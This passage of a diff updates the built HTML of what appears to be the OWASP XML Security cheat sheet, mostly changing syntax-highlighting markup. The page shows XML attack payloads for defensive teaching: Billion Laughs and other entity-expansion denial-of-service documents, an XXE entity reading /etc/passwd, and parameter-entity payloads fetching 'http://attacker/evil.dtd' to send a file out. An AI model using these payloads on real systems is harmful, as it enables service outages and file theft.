+<span class="w">                                            </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">file</span><span class="p">));</span>
+<span class="w">   </span><span class="kt">int</span><span class="w"> </span><span class="n">eventType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlfer</span><span class="p">.</span><span class="na">getEventType</span><span class="p">();</span>
+<span class="w">   </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">xmlfer</span><span class="p">.</span><span class="na">hasNext</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">eventType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlfer</span><span class="p">.</span><span class="na">next</span><span class="p">();</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">xmlfer</span><span class="p">.</span><span class="na">hasText</span><span class="p">()){</span>
+<span class="w">     </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">print</span><span class="p">(</span><span class="n">xmlfer</span><span class="p">.</span><span class="na">getText</span><span class="p">());</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">   </span><span class="p">}</span>
+<span class="w">   </span><span class="n">fr</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w"> </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 <p>The previous code produces the following output:</p>
-<div class="highlight"><pre><span></span><code>$ java parseDocument
-&lt;!DOCTYPE contacts SYSTEM <span class="s2">&quot;contacts.dtd&quot;</span>&gt;John### User Database
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>java<span class="w"> </span>parseDocument
+&lt;!DOCTYPE<span class="w"> </span>contacts<span class="w"> </span>SYSTEM<span class="w"> </span><span class="s2">&quot;contacts.dtd&quot;</span>&gt;John###<span class="w"> </span>User<span class="w"> </span>Database
 ...
-nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
-root:*:0:0:System Administrator:/var/root:/bin/sh
+nobody:*:-2:-2:Unprivileged<span class="w"> </span>User:/var/empty:/usr/bin/false
+root:*:0:0:System<span class="w"> </span>Administrator:/var/root:/bin/sh
 </code></pre></div>
 <h4 id="recursive-entity-reference">Recursive Entity Reference<a class="headerlink" href="#recursive-entity-reference" title="Permanent link">&para;</a></h4>
 <p>When the definition of an element <code>A</code> is another element <code>B</code>, and that element <code>B</code> is defined as element <code>A</code>, that schema describes a circular reference between elements:</p>
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE A [</span>
 <span class="cp"> &lt;!ELEMENT A ANY&gt;</span>
- <span class="cp">&lt;!ENTITY A &quot;&lt;A&gt;</span><span class="ni">&amp;B;</span><span class="nt">&lt;/A&gt;</span>&quot;&gt;
- <span class="cp">&lt;!ENTITY B &quot;&amp;A;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY A &quot;&lt;A&gt;</span><span class="ni">&amp;B;</span><span class="nt">&lt;/A&gt;</span>&quot;&gt;
+<span class="w"> </span><span class="cp">&lt;!ENTITY B &quot;&amp;A;&quot;&gt;</span>
 ]&gt;
 <span class="nt">&lt;A&gt;</span><span class="ni">&amp;A;</span><span class="nt">&lt;/A&gt;</span>
 </code></pre></div>
@@ -2888,24 +2888,24 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 <p>The result of the following attack will be 100,000 x 100,000 characters in memory.</p>
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE root [</span>
 <span class="cp"> &lt;!ELEMENT root ANY&gt;</span>
- <span class="cp">&lt;!ENTITY A &quot;AAAAA...(a 100.000 A&#39;s)...AAAAA&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY A &quot;AAAAA...(a 100.000 A&#39;s)...AAAAA&quot;&gt;</span>
 ]&gt;
-<span class="nt">&lt;root&gt;</span><span class="ni">&amp;A;&amp;A;&amp;A;&amp;A;</span>...(a 100.000 <span class="ni">&amp;A;</span>&#39;s)...<span class="ni">&amp;A;&amp;A;&amp;A;&amp;A;&amp;A;</span><span class="nt">&lt;/root&gt;</span>
+<span class="nt">&lt;root&gt;</span><span class="ni">&amp;A;&amp;A;&amp;A;&amp;A;</span>...(a<span class="w"> </span>100.000<span class="w"> </span><span class="ni">&amp;A;</span>&#39;s)...<span class="ni">&amp;A;&amp;A;&amp;A;&amp;A;&amp;A;</span><span class="nt">&lt;/root&gt;</span>
 </code></pre></div>
 <h4 id="billion-laughs">Billion Laughs<a class="headerlink" href="#billion-laughs" title="Permanent link">&para;</a></h4>
 <p>When an XML parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes. This is an example XML document with an embedded <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> schema including the attack:</p>
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE root [</span>
 <span class="cp"> &lt;!ELEMENT root ANY&gt;</span>
- <span class="cp">&lt;!ENTITY LOL &quot;LOL&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL1 &quot;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL2 &quot;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL3 &quot;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL4 &quot;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL5 &quot;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL6 &quot;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL7 &quot;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL8 &quot;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL9 &quot;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL &quot;LOL&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL1 &quot;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL2 &quot;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL3 &quot;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL4 &quot;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL5 &quot;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL6 &quot;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL7 &quot;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL8 &quot;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL9 &quot;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&quot;&gt;</span>
 ]&gt;
 <span class="nt">&lt;root&gt;</span><span class="ni">&amp;LOL9;</span><span class="nt">&lt;/root&gt;</span>
 </code></pre></div>
@@ -2915,23 +2915,23 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;?XML VERSION=&quot;1.0&quot; ENCODING=&quot;UTF-8&quot;?&gt;</span>
 <span class="cp">&lt;!DOCTYPE SOAP-ENV:ENVELOPE [</span>
 <span class="cp"> &lt;!ELEMENT SOAP-ENV:ENVELOPE ANY&gt;</span>
- <span class="cp">&lt;!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED&gt;</span>
- <span class="cp">&lt;!ENTITY LOL &quot;LOL&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL1 &quot;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL2 &quot;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL3 &quot;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL4 &quot;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL5 &quot;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL6 &quot;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL7 &quot;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL8 &quot;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY LOL9 &quot;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL &quot;LOL&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL1 &quot;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&amp;LOL;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL2 &quot;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&amp;LOL1;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL3 &quot;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&amp;LOL2;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL4 &quot;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&amp;LOL3;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL5 &quot;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&amp;LOL4;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL6 &quot;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&amp;LOL5;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL7 &quot;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&amp;LOL6;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL8 &quot;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&amp;LOL7;&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY LOL9 &quot;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&amp;LOL8;&quot;&gt;</span>
 ]&gt;
-<span class="nt">&lt;SOAP:ENVELOPE</span> <span class="na">ENTITYREFERENCE=</span><span class="s">&quot;&amp;LOL9;&quot;</span>
-               <span class="na">XMLNS:SOAP=</span><span class="s">&quot;HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/&quot;</span><span class="nt">&gt;</span>
- <span class="nt">&lt;SOAP:BODY&gt;</span>
-  <span class="nt">&lt;KEYWORD</span> <span class="na">XMLNS=</span><span class="s">&quot;URN:PARASOFT:WS:STORE&quot;</span><span class="nt">&gt;</span>FOO<span class="nt">&lt;/KEYWORD&gt;</span>
- <span class="nt">&lt;/SOAP:BODY&gt;</span>
+<span class="nt">&lt;SOAP:ENVELOPE</span><span class="w"> </span><span class="na">ENTITYREFERENCE=</span><span class="s">&quot;&amp;LOL9;&quot;</span>
+<span class="w">               </span><span class="na">XMLNS:SOAP=</span><span class="s">&quot;HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/&quot;</span><span class="nt">&gt;</span>
+<span class="w"> </span><span class="nt">&lt;SOAP:BODY&gt;</span>
+<span class="w">  </span><span class="nt">&lt;KEYWORD</span><span class="w"> </span><span class="na">XMLNS=</span><span class="s">&quot;URN:PARASOFT:WS:STORE&quot;</span><span class="nt">&gt;</span>FOO<span class="nt">&lt;/KEYWORD&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/SOAP:BODY&gt;</span>
 <span class="nt">&lt;/SOAP:ENVELOPE&gt;</span>
 </code></pre></div>
 <h4 id="reflected-file-retrieval">Reflected File Retrieval<a class="headerlink" href="#reflected-file-retrieval" title="Permanent link">&para;</a></h4>
@@ -2939,7 +2939,7 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span>
 <span class="cp">&lt;!DOCTYPE root [</span>
 <span class="cp"> &lt;!ELEMENT includeme ANY&gt;</span>
- <span class="cp">&lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot;&gt;</span>
+<span class="w"> </span><span class="cp">&lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot;&gt;</span>
 ]&gt;
 <span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/root&gt;</span>
 </code></pre></div>
@@ -2955,7 +2955,7 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
 <span class="cp">&lt;!DOCTYPE root [</span>
 <span class="cp"> &lt;!ENTITY % xxe SYSTEM &quot;http://attacker/evil.dtd&quot;&gt;</span>
- %xxe;
+<span class="w"> </span>%xxe;
 ]&gt;
 </code></pre></div>
 <h5 id="file-retrieval-with-parameter-entities">File Retrieval with Parameter Entities<a class="headerlink" href="#file-retrieval-with-parameter-entities" title="Permanent link">&para;</a></h5>
@@ -2963,8 +2963,8 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 <div class="highlight"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
 <span class="cp">&lt;!DOCTYPE root [</span>
 <span class="cp"> &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>
- <span class="cp">&lt;!ENTITY % dtd SYSTEM &quot;http://attacker/evil.dtd&quot;&gt;</span>
- %dtd;
+<span class="w"> </span><span class="cp">&lt;!ENTITY % dtd SYSTEM &quot;http://attacker/evil.dtd&quot;&gt;</span>
+<span class="w"> </span>%dtd;
 ]&gt;
 <span class="nt">&lt;root&gt;</span><span class="ni">&amp;send;</span><span class="nt">&lt;/root&gt;</span>
 </code></pre></div>
@@ -3007,42 +3007,6 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
       
         <footer class="md-footer">
   
-    
-    <nav class="md-footer__inner md-grid" aria-label="Footer" >
-      
-        
-        <a href="XML_External_Entity_Prevention_Cheat_Sheet.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: XML External Entity Prevention" rel="prev">
-          <div class="md-footer__button md-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
-          </div>
-          <div class="md-footer__title">
-            <div class="md-ellipsis">
-              <span class="md-footer__direction">
-                Previous
-              </span>
-              XML External Entity Prevention
-            </div>
-          </div>
-        </a>
-      
-      
-        
-        <a href="XSS_Filter_Evasion_Cheat_Sheet.html" class="md-footer__link md-footer__link--next" aria-label="Next: XSS Filter Evasion" rel="next">
-          <div class="md-footer__title">
-            <div class="md-ellipsis">
-              <span class="md-footer__direction">
-                Next
-              </span>
-              XSS Filter Evasion
-            </div>
-          </div>
-          <div class="md-footer__button md-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
-          </div>
-        </a>
-      
-    </nav>
-  
   <div class="md-footer-meta md-typeset">
     <div class="md-footer-meta__inner md-grid">
       <div class="md-copyright">
@@ -3068,12 +3032,11 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
       <div class="md-dialog__inner md-typeset"></div>
     </div>
     
-    <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.16e2a7d4.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.12658920.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
-      <script src="../assets/javascripts/bundle.5a2dcb6a.min.js"></script>
+      <script src="../assets/javascripts/bundle.5cf534bf.min.js"></script>
       
-    
     
   </body>
 </html>
